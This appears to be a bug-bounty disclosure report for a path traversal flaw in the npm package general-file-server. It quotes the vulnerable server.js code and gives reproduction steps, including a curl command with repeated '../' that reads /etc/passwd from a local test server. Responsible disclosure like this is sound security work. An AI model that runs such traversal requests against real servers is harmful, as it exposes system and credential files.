## Vulnerability Information
Hi Guys,

There is Path Traversal in general-file-server module.
It allows to read content of arbitrary files on the remote server.

## Module

**general-file-server**

This is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.

https://www.npmjs.com/package/general-file-server

version: 1.1.8

## Description

Lack of file path sanitization causes that any file on the server might be read by malicious user, despite the fact that there is ```root_path``` setting in module's ```config.js``` file:

```javascript
// sample config.js
module.exports = {
    hostname: '127.0.0.1',
    port: 8080,
    root_path: "./",
    title: "General File Server",
    logo_link: "/____statics/logo.png"
}
```

Here's the code which causes issue:

```javascript
// node_modules/general-file-server/server.js, line 77
if (pathname.search('____statics') == 1) {
        currpath = __dirname + pathname

        fs.stat(currpath, function (err, stat) {
            if (err || stat.isDirectory()) {
                endupwith404(res)
            } else {
                res.writeHeader(200, {
                    'Content-Type': mime.lookup(currpath)
                })
                fs.createReadStream(currpath).pipe(res)
            }
        })
    }
```

As you can see, ```currpath``` is passed to ```fs.createFileStream()``` and piped directly into Response object withou any sanitization against Path Traversal.


## Steps To Reproduce:


- install ```general-file-server```:

```
$ npm install general-file-server
```

- run ```general-file-server``` in direcotry of your choice. It will use settings from ```config.js``` file:

```
me:~/playground/hackerone/Node$ ./node_modules/general-file-server/server.js
> serving "./" http://127.0.0.1:8080
```

- execute following ```curl``` command (adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

- see result:

```
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1

```

Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.
